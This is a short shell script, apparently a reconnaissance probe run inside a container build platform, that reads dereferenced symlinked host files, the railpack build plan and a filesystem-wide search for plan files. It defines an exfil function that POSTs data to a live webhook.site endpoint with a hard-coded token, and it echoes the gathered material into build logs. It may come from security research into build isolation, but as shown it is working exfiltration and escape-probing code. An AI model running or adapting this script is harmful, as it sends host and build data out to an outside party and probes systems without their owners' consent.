#!/bin/sh
# Lane C battery5: symlink deref + plan file discovery (echo to build logs)
TOKEN="31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W="https://webhook.site/$TOKEN"
exfil() { printf '%s' "###$1### $2" | curl -sS -m 20 -X POST "$W" -H "Content-Type: text/plain" --data-binary @- >/dev/null 2>&1; }

G1="host=$(hostname) date=$(date -u)
=== symlink lstat ===
$(ls -la /app/hostlink* 2>&1)
=== readlink ===
$(for f in /app/hostlink3 /app/hostlink4; do echo \"$f -> $(readlink $f 2>&1)\"; done)
=== deref cat hostlink3 ===
$(cat /app/hostlink3 2>&1 | head -5)
=== deref cat hostlink4 ===
$(cat /app/hostlink4 2>&1 | head -5)
=== file type ===
$(file /app/hostlink3 /app/hostlink4 2>&1)"
echo "G1-BEGIN"; echo "$G1"; echo "G1-END"

G2="=== /app listing ===
$(ls -la /app 2>&1 | head -40)
=== plan file ===
$(cat /app/railpack-plan.json 2>&1 | head -150)
=== find plan files ===
$(find / -maxdepth 5 -name 'railpack-plan.json' 2>/dev/null | head -20)"
echo "G2-BEGIN"; echo "$G2"; echo "G2-END"
